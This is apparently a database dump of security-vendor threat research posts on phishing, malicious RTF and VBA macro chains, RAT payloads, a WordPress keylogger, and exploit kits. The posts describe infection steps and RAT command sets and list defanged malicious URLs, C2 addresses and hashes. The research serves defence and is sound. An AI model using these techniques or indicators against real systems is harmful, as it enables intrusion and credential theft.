They track current trends and events to make their attacks more effective, and tax season offers a rich opportunity for attackers to disguise themselves as well-known brands and even government agencies in an effort to exploit users. The Zscaler threat research group has examined the traffic in the Zscaler cloud for the past 2 months and has noticed new phishing websites that attackers are hosting this tax season, and we will share our observations about how they’re targeting their victims and tricking them into divulging personal and financial information.    Tax phishing campaign #1 – IRS phishing over HTTP/HTTPS    Below is a phishing page that is spoofing the IRS in an attempt to collect users’ IRS login credentials.                          Figure 1: IRS Phishing Login page.    The same server was also hosting a fake IRS account unlock webpage as shown below.                          Figure 2: IRS Phishing account unlock page.    In this scenario, the attacker tries to make the user redirect to an e-policy statement hosted on the actual IRS page seen here.    With this page, the attacker is attempting to prevent user suspicion by redirecting the user from this phishing page to a legitimate e-policy statement hosted on the actual IRS page and shown here.                          Figure 3: Original IRS e-policy page to which user is redirected after phishing activity.    At this point, the victims believe they have completed the account unlock process and they proceed to log in on the legitimate page unaware that their information has been stolen.    This activity was observed on a compromised website: valeortho[.]com. From Fig. 1 and Fig. 2, we can see that the phishing website was on HTTP. However, we also saw the same activity over HTTPS.    Tax phishing campaign #2 – “chalbhai” IRS phishing    Another example of an IRS identity validation phishing site can be seen here.                          Figure 4: IRS identity validation phishing.    We see that the phishing page is based on an old template, since the page refers to 2014 Federal Income Tax year. The interesting point to observe is that when we check the source code for this phishing page, we see a term “chalbhai” in the form. We have typically seen this tag associated with phishing pages that look like Microsoft Office 365, Apple ID, Dropbox or DocuSign. This is a good example of criminals adapting their phishing content to reflect current trends. The tag can be seen in the screenshot below.                          Figure 5: “chalbhai” campaign.    The hits for the “chalbhai” phishing campaign for the months of Jan. and Feb. 2018 are shown below.                          Figure 6: “chalbhai” campaign hits for months of Jan and Feb 2018.    Tax phishing campaign #3 - encrypted IRS phishing    Attackers also try to evade detection from network security engines by encrypting webpage content. In this case, the attacker has used the AES algorithm to encrypt the page. Once the page is downloaded on a victim’s machine, the JavaScript on the page will use the AES decrypt function to decrypt the content and display the phishing page in the victim\'s browser. The IRS phishing page that is displayed to the user is shown here.                          Figure 7: IRS identity verification phishing page.    The figure below shows the call to the AES decrypt function on the phishing page,                          Figure 8: AES decrypt call on phishing page.    More examples of phishing URLs employing encrypted content:    irs.gov.com.alfaisalenterprise[.]com/IRS.GOV/IRS.GOV/directpay/indentify.php?ip=    irs.gov.mdnmsv.voltwisecontrols[.]co.ke    irs.gov.dnmsv.vapeshop[.]co.ke    irs.gov.mdnmsv.voltwisecontrols[.]co.ke/caseid0211/wait.php    We have also seen encrypted phishing templates being leveraged to target brands like Apple, Chase, HSBC, and Paypal in past few months.                          Figure 9: AES encrypted phishing campaign hits for months of Jan. and Feb. 2018    Tax phishing campaign #4 -  Intuit TurboTax phishing    Attackers are also targeting known tax preparation tools like TurboTax. Here is one such example.                          Figure 10: turbotax phishing page.    In this instance, once the user enters the information and clicks update, the user is redirected to the actual TurboTax login page shown below. Similar to the IRS example, the attacker steals the information before redirecting to a legitimate page, keeping users unaware that they have fallen victim to a phishing attack.                          Figure 11: Original turbotax login redirect after phishing page submit.    Another variant of the TurboTax phishing page is shown here.                        Figure 12: TurboTax phishing page variant.    Conclusion    We have seen various types of phishing campaigns take advantage of tax season and leverage tax-related themes. The attackers use various methods to deliver the phishing content, ranging from AES-encrypted content served over HTTP, plain templates over HTTP/HTTPS, fake tax products, spoofing well-known brands, and so on. In the phishing campaigns that we analyzed for this report, we noticed that the attackers are leveraging two important entities involved in the tax filing chain for most consumers: popular tax filing software (in this case, TurboTax) and the tax governing agency IRS.    With high stakes during tax season, users should take extra care to ensure the sites they are using are legitimate. Don’t just look at what’s in the window; look at the URL address. All sites should use HTTPS. The domain name should match the name of the site you are visiting, as seen here:                Additionally, users can reference the IRS Tax Scams/Consumer Alerts page as well as this article on phishing attacks, “Phishing Schemes Make IRS ‘Dirty Dozen’ List of Tax Scams for 2018; Individuals, Businesses, Tax Pros Urged to Remain Vigilant.”      Zscaler ThreatlabZ is actively monitoring these tax related phishing campaigns and ensuring that Zscaler customers are protected.', 'Phishing', 'https://www.zscaler.com/blogs/research/2018-tax-season-phishing-scams');

Upon further analysis, we found hundreds of such apps on Google Play with the same infection.    This is not a new threat. Similar infected apps have been found by other researchers, in which the app author’s development platform was probably infected with this malware that injects the malicious iFrame on all HTML files found on the system. It is surprising to see that the trend of APKs infected with Windows malware has continued for almost a year.    There is no impact on the end mobile users who download these apps, as the malware does not target the Android platform, and the domains involved had already been sinkholed. However, the discovery of the malware highlights the fact that propagation of infections across different platforms is quite possible. This vector can be leveraged by a clever attacker to serve second-level malicious payloads depending on the type of device platform visiting the URL.      	  		  			  		  		  			                                Fig. 1: Apps on Google Play from the developer technodroid  		  	           Infected HTML in APK – Ramnit    Infected Android Package Kit (APK) files contain HTML files infected by the Ramnit worm. This worm spreads by infecting all available EXE, DLL, HTML, and HTM files on the compromised Windows system. If the developer’s system is infected with this worm, it will inject a malicious iFrame in the HTM/HTML files in the source code of Android projects that eventually end up in the APK. Since the URL used in the injected iFrame is sinkholed by the Polish CERT, this infection won’t cause any harm to Android devices.           	  		  			  		  		  			                                                 Fig. 2: IFrame injected at the end of HTML  		  	           We found around 150 infected apps that belonged to different developers. Almost all of these APK files are being flagged for the Windows malware infection by various host AV scanners.           	  		  			  		  		  			                                                                        Fig. 3: VirusTotal scan result for a sample APK  		  	           Conclusion    We have reached out to the Google Android security team and shared our analysis. While this malware currently doesn’t cause harm to end users, it is clear that such infections can otherwise act as an open door for other attacks. Google has a category defined to flag such potentially harmful applications known as non-Android threats. Google’s definition of this category is: “An application that contains non-Android threats. These apps are unable to cause harm to the user or Android device, but contain components that are potentially harmful to other platforms.”      IOCs      	  		  			                             MD5

But the ThreatLabZ team recently observed a social engineering campaign with a unique approach. In these cases, malicious RTF documents basically force users to execute an embedded VBA macro, which starts the infection cycle by dropping Quasar RAT and NetWiredRC payloads.    The malicious RTF documents contain Excel sheets that include a macro, which downloads the additional payload on execution. The RTF document has the .doc extension and, while opening it in Microsoft Word, a macro warning popup (Fig. 1) is shown, with which a user can enable or disable the macro. However, with this malicious RTF document, Word shows repeated macro warning popups even if the user has clicked the “Disable Macros” button during the first warning.              Fig1: Macro warning popup         There is no way to stop these popups except to click on all of them or to force-quit Word. The current malicious RTF shows the macro warning popup 10 times, since this malicious RTF document has 10 embedded Excel sheets (see Fig. 2; the yellow dots highlight embedded Excel sheets).             Fig. 2: RTF document content         To achieve this effect, the malware author used “\\objupdate” control [1] for embedded Excel sheet objects (OLE object) (see Fig. 3). This function triggers the macro code inside the embedded Excel sheet to execute while the RTF document is being loaded in the MS Word application, and it’s what causes the multiple macro warning popups to appear.             Fig. 3: \\objupdate control in RTF         The same “\\objupdate” control was used in CVE-2017-0199 [2] . However, the current malicious document is not using this or any other vulnerability.        Fig. 4: Infection flow         Malicious macro analysis         We observed two variations of the malicious macro in this campaign (see Fig. 5). Although the macro code is identical, it is executing the PowerShell command to download intermediate payloads using Schtasks and cmd.exe (See Fig. 6).             Fig. 5: Macro code             Fig. 6: PowerShell commands    The malware also permanently enables macros for Word, PowerPoint, and Excel by doing registry modification.    Intermediate payload    Code in the macro uses PowerShell to download a malicious VBS file and saves it in the %PUBLIC% folder with the name svchost32.vbs.     This malicious VBS code (Fig7) performs the following actions -    Step 1      	  	Terminate all running instances of Microsoft Word and Excel process.  	  	  	Download final payload (using HTTPS protocol) and save it in %PUBLIC% folder with name svchost.exe.  	  	  	Execute the downloaded payload.  	          Fig7: Deobfuscated code of malicious VBS    Step 2      	  	Enable macro and disable protected view settings for Microsoft Word, PowerPoint and Excel (Version 11-16 except 13)  by doing registry modification.  	      Step 3      	  	Create a scheduled task with name as “WindowsUpdates” to run this payload (svchost32.vbs) after 200 minutes.  	      Step 4      	  	Delete “WindowsUpdate” scheduled task, created by macro code.  	      Step 5      	  	Download additional payload and save it in %PUBLIC% folder with name svchosts.exe. We did not see this payload download at the time of analysis and also noticed that this functionality was removed in the recent variants.  	           Final Payloads    We observed NetwiredRC and QusarRat malware as final payloads in this campaign. Both are Remote Admin Tools (RAT). QusarRat is an open source tool [3] and has features like remote webcam, remote shell and keylogging. Similarly, NetwiredRC has features like find file, remote shell, keylogging, screen capture, password stealing [4] etc..         IOCs      	  		  			  			MD5  			  			  			File format  			  			  			Downloaded from  			  		  		  			  			f073328b984dc8ac06b23af413ad2afb  			  			  			RTF  			  			  			files.catbox[.]moe/f9boo3.doc  			  		  		  			  			b127b79890f9fd09c83c24b13e7f45af  			  			  			RTF  			  			  			files.catbox[.]moe/rv6ihr.doc  			  		  		  			  			c26fa78766da89c0c66a59a4be1308ed  			  			  			RTF  			  			  			fast-cargo[.]com/images/file/vb/doc/41.doc  			  		  		  			  			fef2e48585db70ca52197375a23cce57  			  			  			RTF  			  			  			fast-cargo[.]com/images/file/vb/doc/39.doc  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			EXE  			  			  			asaigoldenrice[.]com/fedex/original_doc/fedex.exe  			  		  		  			  			3468E9349C0DE79B3E5F926B8BB4974B  			  			  			EXE  			  			  			asaigoldenrice[.]com/new/document.exe  			  		  		  			  			fa8a7d49d1871b75a9428c1ee35815e5  			  			  			EXE  			  			  			ksuoilfield[.]com/cgi-bim/ksuoilfield/MNBVVCXqwergfd1.exe  			  		  		  			  			2beabd88e7addd0bdf2a4eb06440f322  			  			  			EXE  			  			  			www.fast-cargo[.]com/images/file/vb/exe/door.exe  			  		  		  			  			c06fbecea30782c0e6410a68fa7988f6  			  			  			EXE  			  			  			www.fast-cargo[.]com/images/file/vb/exe/door.exe  			  		  	             	  		  			  			MD5  			  			  			Malware name  			  			  			C2  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			NetwiredRC  			  			  			shawnetw147.sytes[.]net:3136  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			NetwiredRC  			  			  			shawnetw147bkp.sytes[.]net:3136  			  		  		  			  			3468E9349C0DE79B3E5F926B8BB4974B  			  			  			NetwiredRC  			  			  			extensions14718.sytes[.]net:3324  			  		  		  			  			c06fbecea30782c0e6410a68fa7988f6  			  			  			QusarRat  			  			  			23.105.131[.]179:4782  			  		  		  			  			2beabd88e7addd0bdf2a4eb06440f322  			  			  			QusarRat  			  			  			173.46.85[.]227:1337  			  		  	           Conclusion    The Zscaler ThreatLabZ team is actively tracking and reviewing these payloads to ensure that our customers are protected from malicious RTF documents and other campaigns that rely on social engineering tactics to spread malware.', 'Malware', 'https://www.zscaler.com/blogs/research/malicious-rtf-document-leading-netwiredrc-and-quasar-rat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (40, 'February 2018 Zscaler SSL Threat Report', 'Deepen Desai', 'February 06, 2018', 'SSL was introduced in 1994 and TLS in 1999 in response to growing concerns on the security of data being transmitted over the internet. However, the very protocol that was heralded as the ultimate cyber guard has ironically become an increasingly popular tool for cybercriminals to hide their nefarious acts. SSL encrypted traffic is often not inspected by organizations because it is assumed to come from trusted sources, however, that is no longer the case. While great for privacy, SSL is becoming a significant blind spot for companies as the percentage of encrypted traffic has risen sharply over the years. And, while obtaining the digital certificates for SSL used to require a rigorous vetting process for web sites, they can now be more easily obtained, in some cases, for free.    In this bi-annual research update, Zscaler ThreatLabZ examines SSL trends for the latter half of 2017. As the amount of SSL traffic continues to grow, cybercriminals are increasingly using encryption to launch and hide attacks, and free certificates have become an easy disguise for attackers.    According to Google’s Transparency Report,  during the month of December the percentage of pages loaded over HTTPS in Chrome in the US was nearly 80 percent, while on December 1, 2017, Mozilla reported that 66.5% of all pages loaded on Firefox were using HTTPS. In fact, since July 2017, the amount of SSL encrypted traffic on the Zscaler Cloud has increased by 10% to a total of 70% of all web traffic.    Threats in SSL Increase by 30%     Further, the Zscaler cloud now blocks an average of 800,000 SSL encrypted transactions per day because they contain advanced threats. This number is a 30% increase in just the last six months; in the first half of 2017, the average was 600,000 threats daily.    ThreatLabZ has seen that the SSL encrypted channel continues to be leveraged by the cybercriminals in the full attack cycle starting with      	the initial delivery vectors like malvertising, compromised sites, phishing pages, and malicious sites hosting the initial loading page;  	leading to the exploit and/or malware delivery stage – use of SSL to deliver exploit and/or malware payloads;  	and then to call home activity – many prevalent malware families are using SSL based Command and Control communication protocol.      Phishing Site Activity Jumps 300%     There was a significant increase, nearly 300%, in phishing attacks delivered over SSL in the Zscaler Cloud in 2017. Malicious content was delivered in various ways, but ThreatLabZ found two patterns more dominant than others. One method uses a phishing page hosted on a legitimate domain that has been compromised to deliver malware. Another method witnessed by our research team leverages newly registered domains with similar but incorrect addresses that are programmed to imitate the web sites of well-known brands. Some of the brands cybercriminals chose to imitate include DocuSign, Microsoft, Apple and Dropbox.        Diverse and Evolving Malware Payloads     ThreatLabZ saw the distribution of new, unique malicious payloads in the Zscaler Cloud Sandbox in the second half of 2017 that were leveraging SSL/TLS for communication with command and control (C&C) server activity, including malicious documents, APKs, and executables. Interestingly, the distribution of the types of malicious payloads remained the same as in the first half of 2017: 60% were Banking Trojan families, including Dridex, Emotet, Trickbot, Zbot, etc.; 25% were comprised of ransomware families; 12% were comprised of Infostealer Trojan families, including Fareit, Papras, etc.; and the last 3% were smaller families.   Many of these payloads were also delivered over SSL/TLS from such sites as Box, Dropbox, AWS, and Google.    Certain Certificates Are More Popular Vectors    In this update, ThreatLabZ investigated an arbitrary set of approximately 6,700 recent SSL transactions to gain deeper insight into the certificates involved. While the majority of these cases involved legitimate sites with valid certificates being compromised, there were also cases where free short-lived certificates were leveraged by the bad actors specifically to deliver malicious content.    ThreatLabZ then examined three types of certificates in a random sample of over 2800 certificates between November and December –  domain validated (DV), organization validated (OV) and extended validation (EV) – to understand which, if any, were most prevalent in the malicious transactions. What they learned was that DV certificates, which sometimes have a shorter validity period of three months and a less stringent vetting process, are the most abused certificates by cybercriminals. In fact, DV certificates, usually those that are free, were used in 74% of the cases in which SSL content was blocked in the Zscaler Cloud. Of the certificates inspected, 55% had a validity period of less than 12 months, with 35% of those having a validity period of three months or less. CAs responsible for distributing SSL certificates that the Zscaler Cloud blocked included a majority of the well-known authorities, including free as well as commercial CAs.    Web properties are quickly adopting SSL/TLS to curb privacy concerns, but without inspection of encrypted traffic, enterprises run the risk of an attack. Yet, SSL inspection can cause significant performance degradation on security appliances. A multi-layer defense-in-depth strategy that fully supports SSL/TLS inspection is essential to ensure enterprises are secure.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (41, 'Compromised WordPress Sites Stealing Credentials with Keylogger', 'Derek Gooley', 'February 02, 2018', 'Introduction    WordPress compromises have become almost a mundane occurrence in the security industry. The ease and relative simplicity with which one can set up a WordPress instance, coupled with the multitude of available plugins, allows relatively inexperienced users to deploy a functional website quickly and with little hassle. Unfortunately, within this ever-growing library of plugins are many that - through neglect, incompetence, or both - fail to protect against various security threats. Exacerbating this issue are the thousands (millions?) of WordPress users who neglect to apply available security patches to the sites they administer. The result of this situation is the condition of the modern Internet that security researchers have to deal with daily: web sites using WordPress compromised by malicious actors to serve victims with malware, host phishing pages, redirects to exploit kits, and harvesting of credentials. While the frequency of these occurrences causes most of these campaigns to seem mundane and unremarkable, occasionally we discover a noteworthy variation that warrants public attention and analysis.    WordPress Keylogger and Coin Miner    Several months ago, researchers discovered a WordPress infection campaign that injected a JavaScript keylogger into compromised sites’ pages, recording the keystrokes of both users and administrators. The injected scripts also launched cryptocurrency mining scripts, a malicious attempt at revenue generation that recently has become all too familiar. This campaign, which hosted its malicious scripts at the domain “cloudflare[.]solutions” was shut down in early December.        Figure 1: Observed traffic to malicious WordPress script hosts    Shortly after the takedown of the controlling domain, however, a new variation on the campaign appeared, leading to a surge of compromised WordPress sites and affected users in mid-January. This campaign uses three different domains to hosts its malicious content, which, like its predecessor, appear at first glance to be legitimate CDN or hosting domains:    msdns[.]online, cdns[.]ws, cdjs[.]online    Each of these domains hosts slight variations of the same scripts, but they all have the common purpose to launch the JavaScript keylogger and initiate a cryptocurrency mining script. This campaign attempts to disguise itself as a benign Google Analytics library, in one instance naming the injected script “googleanalytics.js”.        Figure 2: cdns[.]ws/lib/googleanalytics.js, obfuscated    While the injected script is virtually identical across all three hosts, the script served by the domain “cdns[.]ws” is obfuscated with a JavaScript packer.        Figure 3: cdns[.]ws/lib/googleanalytics.js, deobfuscated    The initial script injected into WordPress pages includes three additional script files. The first, a script masquerading as a benign jQuery library, is a CoinHive cryptocurrency mining library. The second, “kl.js”, is the keylogger script, which records keystrokes and sends them back to the script host using the JavaScript WebSocket interface. “mnrstrtr.js” ostensibly short for “Miner Starter”, initializes and runs the mining library imported in the first script.    The “msdns.online” host splits this loader script into two parts, a “klldr.js” script, which loads the keylogger functionality, and “mnngldr.js”, which loads and runs the mining library.        Figure 4: cdns[.]ws/lib/kl.js keylogger script, deobfuscated    The contents of this script are designed to look like legitimate software, with references to Yandex statistics tracking and variable names that imply the functionality of a linter (software that is used to find programming errors in source code). The script connects to a the URL obfuscated at the top of the script using the WebSocket protocol and reports observed keystrokes.    Conclusion    The popularity of WordPress as a content management system, and its large library of third-party plugins, makes it an appealing target for criminals. As such, various campaigns using compromised WordPress sites to commit fraud and deliver malware are commonplace. This particular campaign, however, is interesting in that it does not require direct user interaction (e.g. with a phishing page) and does not install malicious software on the victim’s computer (e.g. with an exploit kit), instead opting to passively record user and administrator keystrokes and silently run cryptocurrency mining scripts in the background.    Zscaler protects against this threat, including coverage for both the keylogger and the coin miner parts of the campaign.', 'Compromise', 'https://www.zscaler.com/blogs/research/compromised-wordpress-sites-stealing-credentials-keylogger');

RIG Exploit Kit    RIG EK has maintained its position as the most active exploit kit, but overall volume of RIG traffic was down over the fall quarter. In November, RIG activity declined significantly, and this trend continues throughout December. RIG continues to install ransomware, banking trojans, and cryptocurrency mining software on vulnerable systems.        Figure 1: RIG hits, September 2017 – December 2017        Figure 2: RIG Heat Map    Though still consistently active, the volume of RIG activity dropped significantly in November 2017. Global distribution of RIG activity has also changed since our last roundup. For the last quarter, virtually all observed RIG traffic has been within the United States, Russia, and Japan. This was unexpected, as previous analyses had shown an appreciable amount of activity in Europe, the rest of the Americas, and Southeast Asia.    Among the number of concurrent RIG campaigns this year, the “Seamless” campaign has garnered the most interest. In our Summer 2017 EK Roundup, we covered some of the details of the Seamless campaign, which began early in 2017. This campaign is primarily responsible for infecting victims with the Ramnit banking infostealer.    While most of the changes to RIG EK this year have been relatively insignificant, such as the constant variation of URI variable names in transactions with the exploit kit landing page, a recent usage of the “Punycode” URL encoding method caught the interest of many researchers. Punycode is a method of encoding Unicode characters within normal ASCII URL strings, which received a significant amount of attention this year for being used in numerous phishing attacks. Attackers use Punycode to display URLs in the victim’s browser that are visually similar to trusted websites in what is called an “IDN homograph attack”. Punycode was previously used by the Blackhole exploit kit in 2013 as part of an email spam campaign.        Figure 3: Observed RIG infection attempts using Punycode URLs    This campaign uses the Punycode URL xn--80af6acah5f[.]xn--p1acf, which encodes to the unicode URL рогаоыо[.]рус displaying Cyrillic characters. Other variations of this URL have been observed, including one detailed by Jérôme Segura.    Cryptocurrency mining payloads delivered by exploit kits are becoming increasingly common. These coin-mining packages typically mine alternative cryptocurrencies such as Monero, which have a greater emphasis on privacy and anonymity than Bitcoin. This aids the malicious actors profiting from the cryptocurrency mining in evading tracking by law enforcement agencies.    Earlier this fall we observed a one-off RIG campaign that used a different malicious redirect structure than the common RIG campaigns to deliver the exploit kit. This campaign infected victims with the Dofoil Trojan, which then installed the malicious BitCoinMiner cryptocurrency mining tool.        Figure 4: RIG redirect        Figure 5: RIG cycle    After the coin mining software is installed, it attempts to connect to 21072206[.]ru to begin mining.    Terror Exploit Kit    Terror EK is a more recent exploit kit discovered in late 2016. This kit was formed as an amalgamation of several active exploit kits, particularly using code and exploits taken directly from Sundown EK. Initially, Terror was relatively unsophisticated and was primarily used to infect victims with cryptocurrency mining packages, but has since undergone a number of upgrades.    Terror has been relatively active over the last quarter. Since our last roundup, we have observed several changes in the EK infrastructure and fingerprinting mechanisms.    The majority of detected Terror EK cycles were seen delivered via malvertising campaigns using the Propeller Ads network. Below are the few of domains that were seen redirecting users to the terror EK landing pages:    tqeobp89axcn[.]com    8b0b17dc1f9f8010[.]com    serve.popads[.]net/s?cid=XXX&iuid=XXX&ts=XXX&ps=XXX&pw=XXX&pl=!    pianodisagree[.]webcam    yakset[.]accountant    b-consulting[.]nl    The users were being redirected from few known pirate video streaming and online gaming sites seen below:    btcheat[.]com    mp3spongebob[.]tk    putlockers[.]fm    mp3old[.]tk    watch-series[.]is    widestream[.]io    download.planetlagu[.]online    flvto[.]biz    musicpleer[.]es    sockshare[.]net    onlineatv[.]com    Few of the changes that we saw as compared to start of the year is the use of encoding in the flash exploits used by the exploit kit. We had made detailed analysis of changes in the our previous blog on Terror EK    The previous EK Cycle can be seen below,        Figure 6: Terror EK cycle    Terror EK has begun using HTTPS instead of HTTP on its landing pages.        Figure 7: HTTPS connection to a Terror EK Landing Page    Heavy fingerprinting techniques using ad redirects to evade detections by only redirecting the users to the landing page when they meet specific target conditions. If the targets do not meet requirement then they are commonly redirected to fake Flash Player downloads, free online gaming sites or shopping portals.    The most recent Terror campaigns were seen using the ever-popular CVE-2016-0189 Internet Explorer exploit.    Other Exploit kits    Magnitude Exploit Kit    Magnitude EK is one of the longest-running exploit kits, first launched in 2013. This exploit kit has seen much lower volume activity in recent years, compared to RIG, Angler, and Neutrino (when the latter two were active). Significant changes in Magnitude campaigns are infrequent.    In our last roundup, we noted that Magnitude EK was primarily targeting Southeast Asian countries with malvertising campaigns. This trend continued through the fall quarter, with an increased presence of Magnitude activity specifically targeting South Korea.    Disdain Exploit Kit    Disdain EK is a brand new exploit kit that first appeared in early August. It shares code with Terror EK and uses the same URL pattern, but has many other distinct features. Disdain is currently operating at very low activity, but has been observed distributing the Kasidet infostealer. Malwarebytes has detailed Disdain’s use in alongside a “Fake Flash Player” social engineering attack.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-winter-2018');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (43, 'Meltdown and Spectre vulnerabilities: What you need to know', 'Deepen Desai,', 'January 05, 2018', 'Two major security vulnerabilities in processors, dubbed Meltdown and Spectre, were disclosed earlier this week by Google\'s Project Zero team. With the ability to allow attackers to gain unauthorized access to sensitive information in memory, Meltdown and Spectre represent a new class of microarchitectural attacks that use processor chip performance optimization features to exploit built-in security mechanisms.    Meltdown exploits the out-of-order execution feature of modern processors, allowing user-level programs to access kernel memory using processor caches as covert side channels. This is specific to the way out-of-order execution is implemented in the processors. This vulnerability has been assigned CVE-2017-5754.    Spectre exploits the speculative execution feature that is present in almost all processors in existence today. Two variants of Spectre are known and seem to depend on what is used to influence erroneous speculative execution. The first variant triggers speculative execution by performing a bounds check bypass and has been assigned CVE-2017-5753. The second variant uses branch target injection for the same effect and has been assigned CVE-2017-5715.    What is vulnerable?  Meltdown has the potential to affect every Intel processor that supports out-of-order execution; essentially all Intel processors since 1995. At the moment it is unclear if AMD and ARM processors are affected by Meltdown. Meltdown exploits the shared kernel-space mapping in the user-space virtual memory. Mitigating this vulnerability involves a technique known as Kernel Page Table Isolation (KPTI), which improves the isolation between kernel-space and user-space memory.    Spectre, on the other hand, affects almost every system in existence: desktops, laptops, cloud servers, tablets, and smartphones. Spectre has been exploited successfully on Intel, AMD, ARM, System Z, and Power 9 processors, among others. There is no single fix for this vulnerability, as it is at an architectural level, and mitigation requires fixes at each application level. Exploitation through JavaScript is also possible.      Meltdown vulnerability impact:      	Read arbitrary kernel memory from user space applications  	Fully virtualized machines are not affected (guest user space application cannot read host user/kernel space memory)  	Hypervisor escape is possible in paravirtualized environment (Xen, Docker, etc.)  	Sensitive information disclosure and privilege escalation attacks, as the dumped memory may contain password hashes, private keys, etc.      Spectre vulnerability impact:      	Theoretically allows random access to the entire memory-space  	Works across Virtual Machines  	Practical PoC for user-space to user-space attacks exist at the moment  	Harder to exploit than Meltdown  	Leaking user-space module addresses and thus bypassing ASLR for further attacks is possible (remote code execution)      What may be impacted?    PCs, laptops, servers, virtualization software, cloud servers, and so on, are all impacted if they are running the vulnerable processor.     Meltdown: All modern Intel x86 processors are vulnerable. Exploitation is theoretically possible on AMD and ARM, but not yet practically achieved.    Spectre: Intel, ARM, AMD, System Z, and Power 9 processors.    Is the Zscaler cloud infrastructure vulnerable?    Zscaler runs large parts of its cloud software on dedicated bare metal and does not share processors or memory with anyone else. This safeguards Zscaler infrastructure from attacks that can originate from foreign applications that may try to escape the virtual environment and access our memory regions. The attack can only be executed locally with an attacker running malicious code on the same hardware. Since our execution environment is highly guarded and closed, attackers cannot gain access to launch malicious code. Nonetheless, our cloud operations team is actively working on applying necessary patches after carefully evaluating their impact on performance and stability.    Zscaler customers running virtualized private components on their infrastructure should immediately update their hosts so as to prevent VM escape, in which another guest on the same host may browse memory regions used by other virtualized components. Only software updates to the hosts can protect the guests from these exploits, as a guest OS update will not suffice to protect against another compromised guest. It is the customer’s responsibility to apply updates relevant to their infrastructure.    More details on how Zscaler secures the cloud infrastructure from these vulnerabilities can be found in the post here    The Zscaler official trust post on this issue can be found here.    Zscaler security coverage for exploitation    We have deployed advanced threat signatures to detect some of the known JavaScript-based exploit POCs.    Advanced threat signatures: JS.Spectre.gen (browser exploit)    We are actively working on deploying an assembly-level detection for the exploitation technique involved in both the Meltdown and Spectre attacks. There are no active ITW exploit attempts of Meltdown or Spectre that Zscaler ThreatLabZ is currently aware of, but we will continue to actively monitor and ensure coverage for our customers.    Update - We have deployed assembly-level detection for the exploitation technique in Cloud Sandbox on January 12, 2018    Mitigation    Zscaler ThreatLabZ highly recommends applying both operating system and application-level patches to safeguard systems against these vulnerabilities.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (44, 'CVE-2017-11882 serving RAT and encrypted phishing campaign', 'Mohd Sadique', 'December 20, 2017', 'Introduction    Malicious documents remain one of the most popular vectors for cybercriminals to deliver malware payloads on a user\'s system. While we continue to see many types of VBA macro-based malware, there has been an increasing trend in malicious documents using the DDE protocol for delivering malware executables, which we wrote about last month. Microsoft released a security update last week that should significantly reduce the number of DDE-based attacks:    \"Microsoft has released an update for Microsoft Office that provides enhanced security as a defense-in-depth measure. The update disables the Dynamic Update Exchange protocol (DDE) in all supported editions of Microsoft Word.\" - Microsoft Security Advisory    Zscaler ThreatLabZ has been tracking a new vector involving malicious RTF document files weaponized with the recently disclosed Microsoft memory corruption vulnerability, CVE-2017-11882. In this blog, we will review a recent campaign leveraging this exploit and also share insights on encrypted phishing campaigns.    Infection cycle    In our research into this new exploit, we encountered spam phishing emails containing a malicious document attachment that leads to a Remote Access Trojan (RAT) and an encrypted phishing page.    The complete workflow of this campaign is shown below:        Fig 1: Workflow    The malware is received by the victim in a phishing email with a password-protected archive as the attachment.    An example of one such phishing email can be seen below:        Fig 2: Phishing scam email    The attachment is a password-protected ZIP file, which prevents auto-analysis systems from extracting and analyzing malicious files.    After the extraction of the  ZIP file with the password given in the email, we are presented with an RTF document file. This RTF file exploits the CVE-2017-11882 vulnerability in Microsoft Office software to execute malicious code. Using this vulnerability, the attacker can install malware, access data, or create a new account with full access rights.    Once the document is opened, it shows a plain document to the user. However, in the background it downloads and executes a RAT; as it does, it shows the phishing email content to the user, which leads to a phishing site.    The malicious RTF document file is shown below.        Fig 3: After HEX-to-ASCII conversion.    The RTF file contains the link to \"note,\"\' which is an HTML application that is remotely executed by mshta.exe.    In the header section of note.hta, there is VBScript code that is executed when the file is loaded.        Fig 4: Header section of note.hta    After decoding, the code looks like this.        Fig 5: Decoded PowerShell code inside VBScript of note.hta    The VBScript in note.hta creates a hidden PowerShell process, which downloads malware named clear.exe, stores it in %TEMP% directory with the name clear.exe, and executes it.    Clear.exe is inherently a Python module that is converted from Python to EXE.    After the reverse engineering of clear.exe, we get the malicious Python script, which looks like a RAT client.    The RAT client connects with the Command & Control (C&C) server IP 197.200.145[.]178 on port 2016.    It has a couple of tasks that will be executed when the C&C server sends a command request.        Fig 6: RAT commands (clear.exe)    RAT C&C commands supported:      	  	Kill – kill client connection  	  	  	Selfdestruct – kill client connection and remove traces of exploit  	  	  	Quit – close socket and connection  	  	  	Persistence – make RAT client persistent in system  	  	  	Scan – scan TCP ports  	  	  	Survey – run a system survey  	  	  	Cat <action> – output file on screen  	  	  	Execute <action> – execute a command  	  	  	Ls – list files in current directory  	  	  	Pwd – get working directory  	  	  	Unzip <action> – unzip a file  	  	  	Wget <action> – download a file from web  	      In addition to downloading this RAT executable, the malware will display a phishing email body pretending to come from the UK Government.    When note.hta is executed, it will display the following screen:        Fig 7: note.hta on execution    The hyperlink shown in Fig 7 leads to a phishing site as shown below.        Fig 8: Tax refund phishing site    The source code of this phishing site appears as follows:        Fig 9: AES-encrypted phishing site    The source code of this phishing site is encrypted using AES-256. It decrypts itself when the page loads using the Aes.Ctr.decrypt function.    The aim of this encrypted site is to avoid detection by automated site crawlers, web security systems, IDS/IPS systems, and so on.    This phishing site asks for personal information, including credit card details, and sends it to the attacker.        Fig 10: The phishing site steals the victim\'s personal information    Encrypted phishing campaigns    The AES-encrypted phishing campaign is an old tactic, with sites that are difficult to identify and difficult to catch by a crawler, which is why attackers are 